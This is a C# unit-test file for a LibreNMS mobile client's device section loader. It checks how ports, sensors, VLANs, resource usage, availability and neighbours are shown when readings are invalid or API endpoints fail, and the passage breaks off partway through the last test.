using DashyNMS.Mobile.DeviceSections;
using DashyNMS.Mobile.Services;
using DashyNMS.Mobile.ViewModels;
using DesktopNMS.Core.Api;
using DesktopNMS.Core.Configuration;
using DesktopNMS.Core.Models;
using Microsoft.Extensions.Time.Testing;

namespace DashyNMS.Mobile.Tests;

public sealed class DeviceSectionLoaderTests
{
    [Theory]
    [InlineData("lowerLayerDown")]
    [InlineData("notPresent")]
    public void Known_non_operational_ports_remain_down(string state)
    {
        var row = DeviceSectionLoader.PortRow(new Port { IfName = "Gi0/7", IfOperStatus = state });
        Assert.Equal(RowStatus.Critical, row.Status);
        Assert.Equal("Down", row.Port!.StatusName);
        Assert.DoesNotContain("Down, Down", row.PortSummary);
    }

    [Fact]
    public void Missing_error_counters_do_not_claim_valid_traffic_is_unavailable()
    {
        var row = DeviceSectionLoader.PortRow(new Port { IfName = "port1", IfOperStatus = "up", IfInOctetsRate = 10, IfOutOctetsRate = 20 });
        Assert.Contains("Error readings unavailable", row.PortStatusText);
        Assert.DoesNotContain("Unavailable", row.Value);
    }

    [Fact]
    public void Invalid_rates_do_not_rank_above_valid_traffic_or_offset_errors()
    {
        var row = DeviceSectionLoader.PortRow(new Port { IfName = "Gi0/7", IfOperStatus = "up", IfInOctetsRate = double.PositiveInfinity, IfOutOctetsRate = 10, IfInErrorsRate = 5, IfOutErrorsRate = -1 });
        Assert.Equal(10, row.SortValue);
        Assert.Equal(10, row.Port!.Traffic);
        Assert.Contains("5 errors/s", row.Detail);
        Assert.Equal(RowStatus.Warning, row.Status);
    }

    [Fact]
    public async Task Unknown_ports_remain_in_loader_and_status_grouping_without_fabricated_graph_routes()
    {
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new Port { PortId = 7, IfDescr = "Synthetic interface", IfOperStatus = "testing" }]);
        var groups = await Load(DeviceSection.Ports);
        var row = Assert.Single(Assert.Single(groups));
        Assert.Equal("Unknown", groups[0].Name);
        Assert.Null(row.LinkPortIfName);
        Assert.False(row.IsLink);
        Assert.Contains("Interface graphs unavailable", row.PortDescription);
        Assert.Equal("Unknown", Assert.Single(PortArrangement.Arrange([row], PortSort.Status, PortGrouping.Status)).Name);
    }

    [Fact]
    public void Reported_zero_rates_are_available_and_ok()
    {
        var row = DeviceSectionLoader.PortRow(new Port { IfName = "Gi0/7", IfOperStatus = "up", IfInOctetsRate = 0, IfOutOctetsRate = 0, IfInErrorsRate = 0, IfOutErrorsRate = 0 });
        Assert.Equal(RowStatus.Ok, row.Status);
        Assert.DoesNotContain("Unavailable", row.Value);
        Assert.Contains("OK", row.PortStatusText);
    }

    [Theory]
    [InlineData(null)]
    [InlineData("testing")]
    [InlineData("unknown")]
    public void Unknown_port_state_is_neutral_and_searchable(string? state)
    {
        var row = DeviceSectionLoader.PortRow(new Port { IfName = "Gi0/7", IfOperStatus = state });
        Assert.Equal(RowStatus.None, row.Status);
        Assert.Equal("Unknown", row.Port!.StatusName);
        Assert.True(row.Matches("unknown"));
        Assert.Equal("Gi0/7", row.LinkPortIfName);
    }

    [Theory]
    [InlineData(null)]
    [InlineData(double.NaN)]
    [InlineData(double.PositiveInfinity)]
    [InlineData(-1d)]
    public void Invalid_port_traffic_is_explicitly_unavailable(double? rate)
    {
        var row = DeviceSectionLoader.PortRow(new Port { IfName = "Gi0/7", IfOperStatus = "up", IfInOctetsRate = rate, IfOutOctetsRate = 0 });
        Assert.Contains("In: Unavailable", row.Value);
        Assert.Contains("Readings unavailable", row.PortStatusText);
        Assert.Equal(RowStatus.None, row.Status);
        Assert.True(row.Matches("unavailable"));
    }

    [Fact]
    public void Port_errors_keep_warning_and_graph_identity_independent_of_display_name()
    {
        var row = DeviceSectionLoader.PortRow(new Port { IfName = "Gi0/7", IfDescr = "Synthetic long interface", IfOperStatus = "up", IfInErrorsRate = 2, IfOutErrorsRate = 0 });
        Assert.Equal(RowStatus.Warning, row.Status);
        Assert.Contains("Warning", row.PortDescription);
        Assert.Equal("Gi0/7", row.LinkPortIfName);
    }

    [Fact]
    public void Sensor_rows_expose_missing_readings_and_category_to_search()
    {
        var row = DeviceSectionLoader.SensorRow(new Sensor { SensorId = 7, SensorClass = "temperature" }, new AppSettings());
        Assert.True(row.SensorLayout);
        Assert.Equal("Reading unavailable", row.SensorStatusText);
        Assert.Equal(RowStatus.None, row.Status);
        Assert.True(row.Matches("unavailable"));
        Assert.True(row.Matches("temperature"));
        Assert.Contains("Reading unavailable", row.SensorDescription);
        Assert.DoesNotContain("–", row.SensorDescription);
        Assert.DoesNotContain("—", row.SensorDescription);
        Assert.False(new SectionRow("example").SensorLayout);
    }

    [Fact]
    public void Unregistered_sensor_without_limits_does_not_claim_healthy_text()
    {
        var sensor = new Sensor { SensorId = 7, SensorClass = "custom", Current = 12.34, Unit = "widgets" };
        var row = DeviceSectionLoader.SensorRow(sensor, new AppSettings());
        Assert.Equal("No limits", row.SensorStatusText);
        Assert.Contains("No limits", row.SensorDescription);
        Assert.Equal(RowStatus.None, row.Status);
    }

    [Fact]
    public async Task Sensor_section_filters_device_ids_and_keeps_custom_units_and_limits()
    {
        _client.Sensors.ListAsync(Arg.Any<CancellationToken>()).Returns(new Sensor[]
        {
            new() { DeviceId = DeviceId, SensorId = 7, SensorClass = "custom", Current = 12.34, Unit = "widgets", LimitHigh = 10 },
            new() { DeviceId = 8, SensorId = 8, SensorClass = "temperature", Current = 20 },
        });
        var row = Assert.Single(Assert.Single(await Load(DeviceSection.Sensors)));
        Assert.Equal("12.3 widgets", row.Value);
        Assert.Equal(RowStatus.Critical, row.Status);
        Assert.Equal("Critical", row.SensorStatusText);
        Assert.True(row.Matches("critical"));
        Assert.Contains("10", row.Subtitle);
        Assert.Null(row.LinkDeviceId);
    }

    [Fact]
    public void Missing_sensor_reading_has_no_severity_or_widget_position()
    {
        var sensor = new Sensor { SensorId = 7, SensorClass = "temperature", Current = null, LimitLow = 0, LimitHigh = 100 };
        var reading = DeviceSectionLoader.ReadSensor(sensor, new AppSettings());
        Assert.Equal("–", reading.Value);
        Assert.Equal(RowStatus.None, reading.Status);
        Assert.Null(DashyNMS.Mobile.Widgets.WidgetSnapshot.Position(sensor));
    }

    [Theory]
    [InlineData(double.NaN)]
    [InlineData(double.PositiveInfinity)]
    [InlineData(double.NegativeInfinity)]
    public void Non_finite_readings_have_no_severity_or_fill(double value)
    {
        var sensor = new Sensor { Current = value, LimitLow = 0, LimitHigh = 100 };
        var reading = DeviceSectionLoader.ReadSensor(sensor, new AppSettings());
        Assert.Equal("–", reading.Value);
        Assert.Equal(RowStatus.None, reading.Status);
        Assert.Null(DashyNMS.Mobile.Widgets.WidgetSnapshot.Position(sensor));
    }

    [Fact]
    public void Unknown_sensor_classes_keep_the_api_unit()
    {
        var sensor = new Sensor { SensorClass = "custom", Current = 12.34, Unit = "widgets" };
        Assert.Equal("12.3 widgets", DeviceSectionLoader.ReadSensor(sensor, new AppSettings()).Value);
    }

    [Theory]
    [InlineData("-nan")]
    [InlineData("nan")]
    [InlineData("inf")]
    [InlineData("")]
    public void Invalid_api_readings_load_without_breaking_other_sensors(string value)
    {
        var json = "[{\"sensor_class\":\"custom\",\"sensor_current\":"
            + System.Text.Json.JsonSerializer.Serialize(value)
            + "},{\"sensor_class\":\"temperature\",\"sensor_current\":25}]";
        var sensors = System.Text.Json.JsonSerializer.Deserialize<Sensor[]>(json)!;
        Assert.Equal("–", DeviceSectionLoader.ReadSensor(sensors[0], new AppSettings()).Value);
        Assert.Equal("25 °C", DeviceSectionLoader.ReadSensor(sensors[1], new AppSettings()).Value);
    }

    private const int DeviceId = 7;

    private readonly ILibreNmsClient _client = Fakes.Client();
    private readonly AppSettings _appSettings = new();
    private readonly DeviceSectionLoader _loader;

    public DeviceSectionLoaderTests() => _loader = new DeviceSectionLoader(_client, Fakes.Settings(_appSettings));

    private Task<IReadOnlyList<SectionGroup>> Load(DeviceSection section) => _loader.LoadAsync(section, DeviceId);

    private static Port Port(int id, string name, string oper = "up", string admin = "up", double? inRate = null, double? outRate = null) =>
        new() { PortId = id, DeviceId = DeviceId, IfIndex = id, IfName = name, IfDescr = name, IfOperStatus = oper, IfAdminStatus = admin, IfInOctetsRate = inRate, IfOutOctetsRate = outRate, IfSpeed = 1_000_000_000 };

    [Fact]
    public async Task An_endpoint_librenms_doesnt_have_for_the_device_is_an_empty_section_not_a_failure()
    {
        // As device 444's VLANs (#91): LibreNMS answers 404.
        _client.Vlans.ListAsync(Arg.Any<CancellationToken>())
            .Returns<IReadOnlyList<Vlan>>(_ => throw new LibreNmsApiException("No VLANs found", System.Net.HttpStatusCode.NotFound));

        Assert.Empty(await Load(DeviceSection.Vlans));

        var card = new DeviceSectionCard(DeviceSectionInfo.For(DeviceSection.Vlans));
        card.Show(await Load(DeviceSection.Vlans));
        Assert.False(card.IsVisible); // drops out, as an empty section does
    }

    [Fact]
    public async Task A_real_failure_still_fails_so_the_card_can_say_so()
    {
        _client.Vlans.ListAsync(Arg.Any<CancellationToken>())
            .Returns<IReadOnlyList<Vlan>>(_ => throw new LibreNmsApiException("Server error", System.Net.HttpStatusCode.InternalServerError));

        await Assert.ThrowsAsync<LibreNmsApiException>(() => Load(DeviceSection.Vlans));
    }

    [Theory]
    [InlineData(false)]
    [InlineData(true)]
    public async Task Missing_ports_preserve_vlan_facts_and_unknown_membership(bool synchronous)
    {
        _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns(
            new[] { new Vlan { DeviceId = DeviceId, VlanNumber = 10, VlanName = "Example VLAN" } });
        var missing = new LibreNmsApiException("No endpoint", System.Net.HttpStatusCode.NotFound);
        if (synchronous)
            _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns<IReadOnlyList<Port>>(_ => throw missing);
        else
            _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<Port>>(missing));
        var row = Assert.Single(Assert.Single(await Load(DeviceSection.Vlans)));
        Assert.Equal("VLAN 10", row.Title);
        Assert.Equal("Example VLAN", row.VlanNameText);
        Assert.Equal("No member ports reported", row.VlanPortsText);
    }

    [Theory]
    [InlineData(403, false)]
    [InlineData(500, false)]
    [InlineData(0, false)]
    [InlineData(403, true)]
    public async Task Missing_vlan_source_does_not_mask_port_failure(int status, bool synchronous)
    {
        var missing = new LibreNmsApiException("No VLANs", System.Net.HttpStatusCode.NotFound);
        var failure = new LibreNmsApiException("Ports failed", status == 0 ? null : (System.Net.HttpStatusCode)status) { IsTimeout = status == 0 };
        if (synchronous)
            _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns<IReadOnlyList<Vlan>>(_ => throw missing);
        else
            _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<Vlan>>(missing));
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<Port>>(failure));
        Assert.Same(failure, await Assert.ThrowsAsync<LibreNmsApiException>(() => Load(DeviceSection.Vlans)));
        await _client.Ports.Received(1).ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>());
    }

    [Fact]
    public async Task Both_missing_vlan_sources_remain_an_empty_section()
    {
        var missing = new LibreNmsApiException("No endpoint", System.Net.HttpStatusCode.NotFound);
        _client.Vlans.ListAsync(Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<Vlan>>(missing));
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<Port>>(missing));
        Assert.Empty(await Load(DeviceSection.Vlans));
    }

    [Fact]
    public async Task Sensors_are_this_devices_only_grouped_by_kind_with_desktops_thresholds()
    {
        _client.Sensors.ListAsync(Arg.Any<CancellationToken>()).Returns(
        [
            new Sensor { SensorId = 1, DeviceId = DeviceId, SensorClass = "temperature", Description = "CPU", Current = 45 },
            new Sensor { SensorId = 2, DeviceId = DeviceId, SensorClass = "temperature", Description = "Inlet", Current = 90, LimitHigh = 70 },
            new Sensor { SensorId = 3, DeviceId = DeviceId, SensorClass = "voltage", Description = "PSU 1", Current = 12.1, LimitLow = 11, LimitHigh = 13 },
            new Sensor { SensorId = 4, DeviceId = 99, SensorClass = "temperature", Description = "Someone else's", Current = 20 },
        ]);

        var groups = await Load(DeviceSection.Sensors);

        Assert.Equal(["Temperature", "Voltage"], groups.Select(g => g.Name));
        var temperature = groups[0];
        Assert.Equal(["CPU", "Inlet"], temperature.Select(r => r.Title));
        Assert.Equal("45 °C", temperature[0].Value);
        Assert.Equal(RowStatus.Critical, temperature[1].Status); // over its own LibreNMS limit
        Assert.Equal("12.1 V", groups[1][0].Value);
        Assert.Equal(RowStatus.Ok, groups[1][0].Status);
        Assert.Equal("Limits 11 to 13 V", groups[1][0].Subtitle);
    }

    [Theory]
    [InlineData(50, null, RowStatus.Ok)]
    [InlineData(85, null, RowStatus.Warning)]
    [InlineData(97, null, RowStatus.Critical)]
    [InlineData(65, 60.0, RowStatus.Warning)] // the device's own warning level
    public void Usage_is_coloured_against_its_warning_level(double percent, double? warning, RowStatus expected)
    {
        var row = DeviceSectionLoader.UsageRow("Memory", percent, warning, 4L << 30, 8L << 30);

        Assert.Equal(expected, row.Status);
        Assert.Equal(percent / 100, row.Bar);
    }

    [Theory]
    [InlineData(null)]
    [InlineData(double.NaN)]
    [InlineData(double.PositiveInfinity)]
    [InlineData(double.NegativeInfinity)]
    [InlineData(-1d)]
    [InlineData(101d)]
    public void Invalid_usage_never_implies_a_healthy_or_zero_reading(double? percent)
    {
        var row = DeviceSectionLoader.UsageRow("example.net memory", percent, null, null, null);
        Assert.Equal(RowStatus.None, row.Status);
        Assert.Null(row.Bar);
        Assert.Equal("—", row.Value);
        Assert.True(row.Matches("unavailable"));
        Assert.Contains("Reading unavailable", row.ResourceDescription);
        Assert.DoesNotContain("—", row.ResourceDescription);
    }

    [Theory]
    [InlineData(double.NaN)]
    [InlineData(double.PositiveInfinity)]
    [InlineData(double.NegativeInfinity)]
    [InlineData(-1d)]
    [InlineData(101d)]
    public void Invalid_warning_thresholds_use_default_severity(double warning)
    {
        Assert.Equal(RowStatus.Warning, DeviceSectionLoader.UsageRow("Memory", 85, warning, null, null).Status);
        Assert.Equal(RowStatus.Critical, DeviceSectionLoader.UsageRow("Memory", 99, warning, null, null).Status);
    }

    [Theory]
    [InlineData(-1, 100)]
    [InlineData(101, 100)]
    [InlineData(0, 0)]
    public void Invalid_capacity_is_not_formatted_as_usage(long used, long total)
    {
        Assert.Null(DeviceSectionLoader.UsageRow("example.net storage", null, null, used, total).Subtitle);
    }

    [Fact]
    public void Reported_zero_usage_remains_valid_and_resource_context_is_searchable()
    {
        var row = DeviceSectionLoader.UsageRow("example.net processor", 0, null, null, null) with { ResourceKind = "CPU · Processors" };
        Assert.Equal(RowStatus.Ok, row.Status);
        Assert.Equal(0d, row.Bar);
        Assert.True(row.Matches("CPU"));
        Assert.True(row.Matches("OK"));
        Assert.False(new SectionRow("example.net").Matches("unavailable"));
    }

    [Fact]
    public async Task Resources_group_cpu_memory_and_storage()
    {
        _client.Health.ListProcessorsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([new ProcessorSensor { Description = "CPU 0", UsagePercent = 12 }]);
        _client.Health.ListMempoolsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([new MempoolSensor { Description = "RAM", UsagePercent = 50, UsedBytes = 4L << 30, TotalBytes = 8L << 30 }]);
        _client.Health.ListStorageAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Array.Empty<StorageVolume>());

        var groups = await Load(DeviceSection.Resources);

        Assert.Equal(["Processors", "Memory"], groups.Select(g => g.Name)); // empty Storage left out
        Assert.Equal("4 GB of 8 GB", groups[1][0].Subtitle);
    }

    [Theory]
    [InlineData("en-GB", 99.95, "99.95%")]
    [InlineData("fr-FR", 99.95, "99,95%")]
    [InlineData("en-GB", 99.9996, "99.9996%")]
    [InlineData("fr-FR", 99.9996, "99,9996%")]
    public void Near_full_text_has_literal_culture_specific_expectations(string culture, double value, string expected)
    {
        var previous = System.Globalization.CultureInfo.CurrentCulture;
        try
        {
            System.Globalization.CultureInfo.CurrentCulture = System.Globalization.CultureInfo.GetCultureInfo(culture);
            Assert.Equal(expected, Units.Percent(value));
        }
        finally { System.Globalization.CultureInfo.CurrentCulture = previous; }
    }

    [Fact]
    public async Task Near_full_percentages_preserve_reported_values_in_resources_and_availability()
    {
        var previousCulture = System.Globalization.CultureInfo.CurrentCulture;
        try
        {
            foreach (var culture in new[] { "en-GB", "fr-FR" })
            {
                System.Globalization.CultureInfo.CurrentCulture = System.Globalization.CultureInfo.GetCultureInfo(culture);
                foreach (var percent in new[] { 99.95, 99.97, 99.995, 99.9996, Math.BitDecrement(100d), 100d, 0d })
                {
                    var expected = percent.ToString("R", System.Globalization.CultureInfo.CurrentCulture) + "%";
                    var resource = DeviceSectionLoader.UsageRow("example.net CPU", percent, null, null, null);
                    Assert.Equal(expected, resource.Value);
                    Assert.Equal(percent / 100, resource.Bar);
                    Assert.Equal(percent >= 95 ? RowStatus.Critical : RowStatus.Ok, resource.Status);
                    Assert.Contains(expected, resource.ResourceDescription);
                    var card = new DeviceSectionCard(DeviceSectionInfo.For(DeviceSection.Resources));
                    card.Show([new SectionGroup("Processors", [resource])]);
                    Assert.Same(resource, Assert.Single(card.Highlights));
                    Assert.Equal(expected, card.Highlights[0].Value);

                    _client.Devices.GetAvailabilityAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
                        [new AvailabilityWindow { DurationSeconds = 86400, Percent = percent }]);
                    _client.Devices.GetOutagesAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Array.Empty<DeviceOutage>());
                    var availability = Assert.Single(Assert.Single(await Load(DeviceSection.Availability)));
                    Assert.Equal(expected, availability.Value);
                    if (percent < 100)
                        Assert.NotEqual("100%", resource.Value);
                }
                Assert.Equal("—", Units.Percent(null));
                Assert.Equal("—", DeviceSectionLoader.UsageRow("example.net CPU", null, null, null, null).Value);
                Assert.Equal(12.3.ToString("0.#", System.Globalization.CultureInfo.CurrentCulture) + "%", Units.Percent(12.34));
            }
        }
        finally
        {
            System.Globalization.CultureInfo.CurrentCulture = previousCulture;
        }
    }

    [Fact]
    public async Task Unsupported_cpu_preserves_supported_memory_and_storage()
    {
        _client.Health.ListProcessorsAsync(DeviceId, Arg.Any<CancellationToken>())
            .Returns<IReadOnlyList<ProcessorSensor>>(_ => throw new LibreNmsApiException("No processors", System.Net.HttpStatusCode.NotFound));
        _client.Health.ListMempoolsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([new MempoolSensor { Description = "example.net RAM", UsagePercent = 50 }]);
        _client.Health.ListStorageAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([new StorageVolume { Description = "example.net disk", UsagePercent = 25 }]);

        var groups = await Load(DeviceSection.Resources);
        Assert.Equal(["Memory", "Storage"], groups.Select(g => g.Name));
        Assert.Equal("50%", groups[0][0].Value);
        Assert.Equal("25%", groups[1][0].Value);
    }

    [Theory]
    [InlineData(403, false)]
    [InlineData(500, false)]
    [InlineData(0, false)]
    [InlineData(403, true)]
    [InlineData(500, true)]
    [InlineData(0, true)]
    public async Task Unsupported_cpu_cannot_mask_memory_failure(int status, bool faultedTask)
    {
        var error = new LibreNmsApiException("Memory endpoint failed", status == 0 ? null : (System.Net.HttpStatusCode)status) { IsTimeout = status == 0 };
        _client.Health.ListProcessorsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            Task.FromException<IReadOnlyList<ProcessorSensor>>(new LibreNmsApiException("No processors", System.Net.HttpStatusCode.NotFound)));
        if (faultedTask)
            _client.Health.ListMempoolsAsync(DeviceId, Arg.Any<CancellationToken>())
                .Returns(Task.FromException<IReadOnlyList<MempoolSensor>>(error));
        else
            _client.Health.ListMempoolsAsync(DeviceId, Arg.Any<CancellationToken>())
                .Returns<IReadOnlyList<MempoolSensor>>(_ => throw error);
        _client.Health.ListStorageAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Array.Empty<StorageVolume>());

        Assert.Same(error, await Assert.ThrowsAsync<LibreNmsApiException>(() => Load(DeviceSection.Resources)));
        await _client.Health.Received(1).ListStorageAsync(DeviceId, Arg.Any<CancellationToken>());
    }

    [Fact]
    public async Task All_unsupported_resource_categories_are_empty()
    {
        var error = new LibreNmsApiException("Unsupported health category", System.Net.HttpStatusCode.NotFound);
        _client.Health.ListProcessorsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<ProcessorSensor>>(error));
        _client.Health.ListMempoolsAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<MempoolSensor>>(error));
        _client.Health.ListStorageAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Task.FromException<IReadOnlyList<StorageVolume>>(error));
        Assert.Empty(await Load(DeviceSection.Resources));
    }

    [Fact]
    public async Task Ports_put_the_ones_that_need_looking_at_first()
    {
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
        [
            Port(1, "Gi0/1", inRate: 1_250_000, outRate: 125_000),
            Port(2, "Gi0/2", oper: "down"),
            Port(3, "Gi0/3", oper: "down", admin: "down"),
        ]);

        var groups = await Load(DeviceSection.Ports);

        Assert.Equal(["Down", "Up", "Shut down"], groups.Select(g => g.Name));
        Assert.Equal(RowStatus.Critical, groups[0][0].Status);
        Assert.Equal("In: 10 Mb/s · Out: 1 Mb/s", groups[1][0].Value); // octets/s to bits/s
        Assert.Equal("1 Gb/s", groups[1][0].Detail);
        Assert.Equal(RowStatus.Inactive, groups[2][0].Status);
    }

    [Fact]
    public async Task Neighbours_link_to_their_devices()
    {
        _client.Links.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new NetworkLink { Id = 1, LocalDeviceId = DeviceId, LocalPortId = 1, RemoteHostname = "core-sw", RemoteDeviceId = 3, RemotePort = "Gi1/0/48", Protocol = "lldp", Active = true }]);
        _client.Links.ListAllAsync(Arg.Any<CancellationToken>()).Returns(Array.Empty<NetworkLink>());
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([Port(1, "Gi0/1")]);

        var row = Assert.Single(Assert.Single(await Load(DeviceSection.Neighbours)));

        Assert.Equal("core-sw", row.Title);
        Assert.Equal("Gi0/1 → Gi1/0/48", row.Subtitle);
        Assert.Equal("LLDP", row.Value);
        Assert.Equal("1 Gb/s", row.Fields.Single(f => f.Name == "Speed").Value);
        Assert.Equal("This device via LLDP", row.Fields.Single(f => f.Name == "Seen by").Value);
        Assert.Equal("Unknown", row.Fields.Single(f => f.Name == "Traffic in").Value);
        Assert.Equal(3, row.LinkDeviceId);
    }

    [Fact]
    public async Task Neighbour_cards_expose_local_link_state_and_octets_as_bits()
    {
        _client.Links.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new NetworkLink { Id = 1, LocalDeviceId = DeviceId, LocalPortId = 1, RemoteHostname = "example.net", Protocol = "lldp", Active = true }]);
        _client.Links.ListAllAsync(Arg.Any<CancellationToken>()).Returns(Array.Empty<NetworkLink>());
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([Port(1, "Gi0/1", oper: "down", inRate: 1250000, outRate: 125000)]);
        var row = Assert.Single(Assert.Single(await Load(DeviceSection.Neighbours)));
        Assert.Equal(RowStatus.Critical, row.Status);
        Assert.Equal("Down", row.Fields.Single(f => f.Name == "Local port state").Value);
        Assert.Equal("10 Mb/s", row.Fields.Single(f => f.Name == "Traffic in").Value);
        Assert.Equal("1 Mb/s", row.Fields.Single(f => f.Name == "Traffic out").Value);
        Assert.True(row.Matches("Gi0/1"));
        Assert.True(row.Matches("LLDP"));
    }

    private static LibreNmsApiException NoPortsFound() =>
        new("No ports found", System.Net.HttpStatusCode.NotFound, "No ports found");

    [Theory]
    [InlineData(null)]
    [InlineData(0)]
    public void Unmonitored_neighbours_do_not_announce_an_unavailable_action(int? deviceId)
    {
        var row = new SectionRow("edge.example.net") { NeighbourLayout = true, LinkDeviceId = deviceId, Detail = "Not monitored" };
        Assert.False(row.CanOpenNeighbour);
        Assert.Equal(row.NeighbourSummary, row.NeighbourAction);
        Assert.DoesNotContain("Open neighbouring device", row.NeighbourAction);
        var monitored = row with { LinkDeviceId = 7 };
        Assert.True(monitored.CanOpenNeighbour);
        Assert.Contains("Open neighbouring device", monitored.NeighbourAction);
    }

    [Theory]
    [InlineData(null)]
    [InlineData(7)]
    public void Graph_selection_announces_complete_facts_without_promising_navigation(int? deviceId)
    {
        var row = new SectionRow("edge.example.net")
        {
            NeighbourLayout = true, LinkDeviceId = deviceId,
            Subtitle = "local-port → remote-port", Value = "LLDP/CDP",
            Detail = deviceId is null ? "Not monitored in LibreNMS" : "Example platform",
            Fields = [new("Local port state", "State unknown"), new("Traffic in", "Unknown"), new("Seen by", "This device via LLDP")],
        };
        Assert.Contains("Show neighbour card", row.NeighbourGraphDescription);
        foreach (var fact in new[] { row.Title, row.Subtitle, row.Value, row.Detail, "Local port state: State unknown", "Traffic in: Unknown", "Seen by: This device via LLDP" })
            Assert.Contains(fact!, row.NeighbourGraphDescription);
        Assert.DoesNotContain("Open neighbouring device", row.NeighbourGraphDescription);
    }

    [Theory]
    [InlineData("testing", double.NaN)]
    [InlineData("unknown", double.PositiveInfinity)]
    [InlineData("", -1)]
    public async Task Neighbours_do_not_invent_port_state_or_traffic(string state, double rate)
    {
        _client.Links.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new NetworkLink { Id = 1, LocalDeviceId = DeviceId, LocalPortId = 1, RemoteHostname = "edge.example.net", RemoteDeviceId = 8, RemotePort = "eth0", Protocol = "lldp", Active = true }]);
        _client.Links.ListAllAsync(Arg.Any<CancellationToken>()).Returns(Array.Empty<NetworkLink>());
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([Port(1, "eth1", oper: state, inRate: rate, outRate: 0)]);
        var row = Assert.Single(Assert.Single(await Load(DeviceSection.Neighbours)));
        Assert.Equal(RowStatus.None, row.Status);
        Assert.Equal("State unknown", row.Fields.Single(f => f.Name == "Local port state").Value);
        Assert.Equal("Unknown", row.Fields.Single(f => f.Name == "Traffic in").Value);
        Assert.NotEqual("Unknown", row.Fields.Single(f => f.Name == "Traffic out").Value);
        Assert.True(row.CanOpenNeighbour);
        Assert.Contains("eth1 → eth0", row.NeighbourAction);
        Assert.Contains("State unknown", row.NeighbourAction);
        Assert.True(row.Matches("State unknown"));
        Assert.Equal(8, row.LinkDeviceId);
    }

    [Fact]
    public async Task A_ping_only_device_lists_the_switch_that_sees_it_by_name()
    {
        _client.Links.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(Array.Empty<NetworkLink>());
        _client.Links.ListAllAsync(Arg.Any<CancellationToken>()).Returns(
            [new NetworkLink { Id = 5, LocalDeviceId = 3, LocalPortId = 48, RemoteDeviceId = DeviceId, RemotePort = "eth0", Protocol = "lldp", Active = true }]);
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns<IReadOnlyList<Port>>(_ => throw NoPortsFound());
        _client.Devices.GetAsync("3", Arg.Any<CancellationToken>()).Returns(Fakes.Device(3, "access-sw"));

        var groups = await Load(DeviceSection.Neighbours);

        var row = Assert.Single(Assert.Single(groups));
        Assert.Equal("access-sw", row.Title);
        Assert.Equal("eth0 → Unknown port", row.Subtitle);
        Assert.Equal("access-sw via LLDP", row.Fields.Single(f => f.Name == "Seen by").Value);
        Assert.Equal("State unknown", row.Fields.Single(f => f.Name == "Local port state").Value);
        Assert.Equal(3, row.LinkDeviceId);

        var card = new DeviceSectionCard(DeviceSectionInfo.For(DeviceSection.Neighbours));
        card.Show(groups);
        Assert.Equal("1 neighbour · 1 in LibreNMS", card.SummaryText);
    }

    [Fact]
    public async Task A_failed_ports_lookup_falls_back_to_the_links_own_port_text()
    {
        _client.Links.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new NetworkLink { Id = 1, LocalDeviceId = DeviceId, LocalPortId = 1, RemoteHostname = "core-sw", RemoteDeviceId = 3, RemotePort = "Gi1/0/48", Protocol = "lldp", Active = true }]);
        _client.Links.ListAllAsync(Arg.Any<CancellationToken>()).Returns(Array.Empty<NetworkLink>());
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>())
            .Returns<IReadOnlyList<Port>>(_ => throw new LibreNmsApiException("Server error", System.Net.HttpStatusCode.InternalServerError));

        var row = Assert.Single(Assert.Single(await Load(DeviceSection.Neighbours)));

        Assert.Equal("core-sw", row.Title);
        Assert.Equal("Unknown port → Gi1/0/48", row.Subtitle);
    }

    [Fact]
    public async Task A_neighbour_LibreNMS_doesnt_monitor_says_so_and_opens_nothing()
    {
        _client.Links.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns(
            [new NetworkLink { Id = 1, LocalDeviceId = DeviceId, LocalPortId = 1, RemoteHostname = "phone-42", RemotePort = "Port 1", RemotePlatform = "IP Phone", Protocol = "cdp", Active = true }]);
        _client.Links.ListAllAsync(Arg.Any<CancellationToken>()).Returns(Array.Empty<NetworkLink>());
        _client.Ports.ListForDeviceAsync(DeviceId, Arg.Any<CancellationToken>()).Returns([Port(1, "Gi0/1")]);

        var row = Assert.Single(Assert.Single(await Load(DeviceSection.Neighbours)));

        Assert.Equal("phone-42", row.Title);
        Assert.Equal("IP Phone · Not monitored in LibreNMS", row.Detail);
        Assert.Equal(RowStatus.Ok, row.Status);
